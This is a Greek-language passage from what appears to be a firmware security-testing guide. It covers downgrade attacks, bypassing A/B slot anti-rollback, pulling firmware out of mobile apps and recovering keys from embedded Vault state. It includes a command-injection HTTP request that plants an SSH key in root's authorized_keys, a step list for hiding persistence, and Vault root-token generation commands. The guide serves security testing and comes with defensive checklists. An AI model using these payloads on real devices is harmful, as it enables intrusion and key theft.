   * Web UI, API mobile app, USB, TFTP, MQTT κ.λπ.
   * Πολλές καταναλωτικές IoT συσκευές εκθέτουν HTTP(S) endpoints *χωρίς authentication*, τα οποία δέχονται firmware blobs κωδικοποιημένα σε Base64, τα αποκωδικοποιούν στην πλευρά του server και ενεργοποιούν recovery/upgrade.
3. Μετά το downgrade, εκμεταλλευτείτε μια ευπάθεια που διορθώθηκε σε νεότερη έκδοση (για παράδειγμα, ένα φίλτρο command-injection που προστέθηκε αργότερα).
4. Προαιρετικά, εγκαταστήστε ξανά το πιο πρόσφατο image ή απενεργοποιήστε τις ενημερώσεις για να αποφύγετε τον εντοπισμό, αφού αποκτήσετε persistence.

### Παράδειγμα: Command Injection μετά από downgrade

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

Στο ευάλωτο (υποβαθμισμένο) firmware, η παράμετρος `md5` συνενώνεται απευθείας σε μια εντολή shell χωρίς απολύμανση, επιτρέποντας την εισαγωγή αυθαίρετων εντολών (εδώ — την ενεργοποίηση πρόσβασης root μέσω κλειδιού SSH). Οι μεταγενέστερες εκδόσεις firmware πρόσθεσαν ένα βασικό φίλτρο χαρακτήρων, αλλά η απουσία προστασίας από υποβάθμιση καθιστά άχρηστη τη διόρθωση.<sup>[[4]](#references)</sup>

### Εξαγωγή firmware από εφαρμογές για κινητά

Πολλοί προμηθευτές ενσωματώνουν πλήρεις εικόνες firmware στις συνοδευτικές εφαρμογές τους για κινητά, ώστε η εφαρμογή να μπορεί να ενημερώνει τη συσκευή μέσω Bluetooth/Wi-Fi. Αυτά τα πακέτα αποθηκεύονται συνήθως χωρίς κρυπτογράφηση στο APK/APEX, σε διαδρομές όπως `assets/fw/` ή `res/raw/`. Εργαλεία όπως τα `apktool`, `ghidra` ή ακόμη και το απλό `unzip` σάς επιτρέπουν να εξαγάγετε υπογεγραμμένες εικόνες χωρίς να αγγίξετε το φυσικό υλικό.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Παράκαμψη anti-rollback μόνο μέσω updater σε σχεδιασμούς A/B slot

Ορισμένοι vendors εφαρμόζουν όντως ένα **ratchet** κατά του downgrade, αλλά μόνο στη λογική του *updater* (για παράδειγμα, σε μια ρουτίνα UDS μέσω CAN, σε μια εντολή recovery ή σε έναν OTA agent σε userspace). Αν ο **bootloader** ελέγχει αργότερα μόνο την υπογραφή/CRC του image και εμπιστεύεται τον πίνακα partition ή τα metadata του slot, η προστασία από rollback μπορεί και πάλι να παρακαμφθεί.<sup>[[7]](#references)</sup>

Τυπικός αδύναμος σχεδιασμός:

- Τα metadata του firmware περιέχουν τόσο έναν descriptor έκδοσης όσο και ένα **security ratchet** / monotonic counter.
- Ο updater συγκρίνει το ratchet του image με μια τιμή που είναι αποθηκευμένη σε persistent storage και απορρίπτει παλαιότερα υπογεγραμμένα images.
- Ο bootloader **δεν** αναλύει αυτό το ratchet και επαληθεύει μόνο το header, το CRC και την υπογραφή πριν εκκινήσει το επιλεγμένο slot.
- Η ενεργοποίηση του slot αποθηκεύεται χωριστά σε έναν πίνακα partition ή σε έναν generation counter ανά slot και **δεν είναι κρυπτογραφικά δεσμευμένη** στο ακριβές firmware digest που επικυρώθηκε.

Αυτό δημιουργεί ένα primitive **επικύρωση ενός image / εκκίνηση άλλου image** σε συστήματα dual-slot. Αν ο attacker μπορεί να κάνει τον updater να ορίσει το slot B ως επόμενο στόχο εκκίνησης χρησιμοποιώντας ένα τρέχον, υπογεγραμμένο image και αργότερα να αντικαταστήσει το slot B πριν από την επανεκκίνηση, ο bootloader μπορεί και πάλι να εκκινήσει το υποβαθμισμένο image, επειδή εμπιστεύεται μόνο τα metadata του slot που έχουν ήδη καταχωριστεί.

Συνηθισμένο μοτίβο κατάχρησης:

1. Ανεβάστε ένα **τρέχον, υπογεγραμμένο** firmware στο παθητικό slot και εκτελέστε την κανονική ρουτίνα επικύρωσης/εναλλαγής, ώστε η διάταξη να ορίσει αυτό το slot ως το επόμενο ενεργό.
2. **Μην κάνετε ακόμη επανεκκίνηση**. Επανεισέλθετε στη ρουτίνα προετοιμασίας/διαγραφής slot στην ίδια συνεδρία.
3. Εκμεταλλευτείτε παρωχημένη κατάσταση εκκίνησης ή παρωχημένη λογική επιλογής slot, ώστε ο updater να διαγράψει το **ίδιο φυσικό slot** που μόλις προήχθη.
4. Γράψτε ένα **παλαιότερο αλλά ακόμη υπογεγραμμένο** firmware σε αυτό το slot.
5. Παραλείψτε τη ρουτίνα επικύρωσης που επιβάλλει το ratchet και κάντε απευθείας επανεκκίνηση.
6. Ο bootloader επιλέγει το slot που προήχθη, επαληθεύει μόνο την υπογραφή/ακεραιότητα και εκκινεί το παλιό image.

Τι να αναζητήσετε κατά την αντίστροφη ανάλυση υλοποιήσεων ενημέρωσης A/B:

- Επιλογή slot που προκύπτει από **flags κατά την εκκίνηση**, τα οποία δεν ανανεώνονται μετά από επιτυχημένη εναλλαγή.
- Μια ρουτίνα τύπου `prepare_passive_slot()` που διαγράφει ένα slot βάσει παρωχημένης κατάστασης αντί της **τρέχουσας καταχωρισμένης διάταξης**.
- Μια συνάρτηση τύπου `part_write_layout()` που απλώς αυξάνει έναν **generation counter** / active flag και δεν αποθηκεύει το hash του image που επικυρώθηκε.
- Έλεγχοι ratchet που υλοποιούνται σε userspace ή στον κώδικα του updater, αλλά **όχι** στα στάδια ROM / bootloader / secure boot.
- Ρουτίνες διαγραφής ή recovery που αφήνουν το slot σημειωμένο ως εκκινήσιμο, ακόμη και αφού το περιεχόμενό του διαγραφεί και ξαναγραφτεί.

### Checklist για την αξιολόγηση της λογικής ενημέρωσης

* Προστατεύονται επαρκώς η μεταφορά και η αυθεντικοποίηση του *update endpoint* (TLS + authentication);
* Συγκρίνει η συσκευή **αριθμούς έκδοσης** ή έναν **monotonic anti-rollback counter** πριν από το flashing;
* Επαληθεύεται το image μέσα σε μια αλυσίδα secure boot (π.χ. ελέγχονται οι υπογραφές από κώδικα ROM);
* Επιβάλλει ο **bootloader το ίδιο ratchet** με τον updater, αντί να ελέγχει μόνο την υπογραφή/CRC;
* Είναι τα metadata ενεργοποίησης του slot **δεσμευμένα στο επικυρωμένο firmware digest/έκδοση**, ή μπορεί να τροποποιηθεί ένα slot μετά την προαγωγή του;
* Μετά από επιτυχημένη εναλλαγή slot, επιβάλλεται επανεκκίνηση της συσκευής ή παραμένουν προσβάσιμες στην ίδια συνεδρία μεταγενέστερες ρουτίνες ενημέρωσης/διαγραφής;
* Εκτελεί ο κώδικας του userland πρόσθετους ελέγχους εγκυρότητας (π.χ. επιτρεπόμενο partition map, αριθμό μοντέλου);
* Επαναχρησιμοποιούν τις ίδιες ρουτίνες επικύρωσης οι ροές ενημέρωσης *partial* ή *backup*;

> 💡  Αν λείπει κάποιο από τα παραπάνω, η πλατφόρμα είναι πιθανότατα ευάλωτη σε επιθέσεις rollback.

## Ευάλωτο firmware για εξάσκηση

Για εξάσκηση στην ανακάλυψη ευπαθειών σε firmware, χρησιμοποιήστε ως αφετηρία τα ακόλουθα projects ευάλωτου firmware.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Ανάκτηση κλειδιών αποκρυπτογράφησης firmware από ενσωματωμένη κατάσταση KMS/Vault

Όταν ένα update image συνδυάζει μικρά metadata σε plaintext με ένα μεγάλο blob υψηλής εντροπίας, κάντε πρώτα διαλογή του container πριν δοκιμάσετε brute-force:<sup>[[1]](#references)</sup>

- Εξαγάγετε headers, offsets και όρια γραμμών με `hexdump`, `xxd`, `strings -tx`, `base64 -d` και `binwalk -E`.
- Το `Salted__` συνήθως υποδεικνύει μορφή OpenSSL `enc`: τα επόμενα 8 bytes είναι το salt και τα υπόλοιπα bytes είναι το ciphertext.
- Ένα πεδίο Base64 που αποκωδικοποιείται σε ακριβώς `256` bytes είναι ισχυρή ένδειξη ότι πρόκειται για ciphertext RSA-2048 που περιέχει τυχαίο firmware password/session key.
- Αποσπασμένο υλικό PGP στο ίδιο αρχείο συχνά προστατεύει μόνο την αυθεντικότητα· μην υποθέτετε ότι αποτελεί τον μηχανισμό εμπιστευτικότητας.

Αν αποτύχει η στατική αναζήτηση κλειδιών (`grep`, `strings`, αναζητήσεις PEM/PGP), κάντε reverse το **operational decrypt path** αντί να ψάχνετε μόνο για private keys:

- Κάντε decompile το updater / management binary και εντοπίστε ποιος διαβάζει το κρυπτογραφημένο blob, ποιο helper/API το ξετυλίγει και ποιο λογικό όνομα κλειδιού ζητά.
- Αναζητήστε στο εξαγόμενο root filesystem κατάσταση KMS (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), καθώς και αρχεία unit και init scripts.
- Αντιμετωπίστε εντολές plaintext `vault operator unseal ...`, recovery keys, bootstrap tokens ή τοπικά scripts αυτόματου unseal του KMS ως ισοδύναμα με υλικό private-key.

Αν το appliance περιλαμβάνει το αρχικό binary του Vault και το storage backend, η αναπαραγωγή εκείνου του περιβάλλοντος είναι συνήθως ευκολότερη από την επανυλοποίηση των εσωτερικών λειτουργιών του Vault:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Με root στο κλωνοποιημένο KMS:

- Κάντε τα transit keys εξαγώγιμα μόνο μέσα στο απομονωμένο clone: `vault write transit/keys/<name>/config exportable=true`
- Εξαγάγετε το κλειδί unwrap: `vault read transit/export/encryption-key/<name>`
- Δοκιμάστε το ανακτημένο RSA key με τον ακριβή συνδυασμό padding/hash που χρησιμοποιεί το KMS. Αποτυχία αποκρυπτογράφησης με PKCS#1 v1.5 και αποτυχία αποκρυπτογράφησης με το προεπιλεγμένο OAEP **δεν** αποδεικνύουν ότι το key είναι λανθασμένο· πολλές ροές που βασίζονται στο Vault χρησιμοποιούν OAEP με SHA-256, ενώ οι συνηθισμένες βιβλιοθήκες έχουν ως προεπιλογή το SHA-1.
- Αν το payload ξεκινά με `Salted__`, αναπαραγάγετε ακριβώς το OpenSSL KDF του κατασκευαστή (`EVP_BytesToKey`, συχνά MD5 σε παλαιότερες συσκευές) πριν επιχειρήσετε αποκρυπτογράφηση AES-CBC.

Έτσι, το «κρυπτογραφημένο firmware» γίνεται ένα γενικότερο πρόβλημα: **ανακτήστε τα επιχειρησιακά keys από την πλευρά της συσκευής και, στη συνέχεια, αναπαραγάγετε ακριβώς τις παραμέτρους unwrap + KDF offline**.

## Εκπαίδευση και Πιστοποιήσεις

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Cracking Firmware with Claude: Δεξιότητες ανώτερου επιπέδου, αυτονομία αρχάριου επιπέδου](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Μεθοδολογία δοκιμών ασφάλειας firmware](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Πρακτικό IoT Hacking: Ο οριστικός οδηγός για την επίθεση στο Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Εκμετάλλευση zero-day ευπαθειών σε εγκαταλελειμμένο hardware – ιστολόγιο Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Πώς μια έξυπνη συσκευή των $20 μου έδωσε πρόσβαση στο σπίτι σας](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Τώρα βλέπεις το mi: τώρα έχεις γίνει θύμα επίθεσης](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Εκμετάλλευση του Tesla Wall Connector μέσω της θύρας φόρτισής του - Μέρος 2: παράκαμψη του anti-downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Κάντε το να αναβοσβήνει: Εκμετάλλευση του Philips Hue Bridge μέσω over-the-air](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
{{#include ../../banners/hacktricks-training.md}}
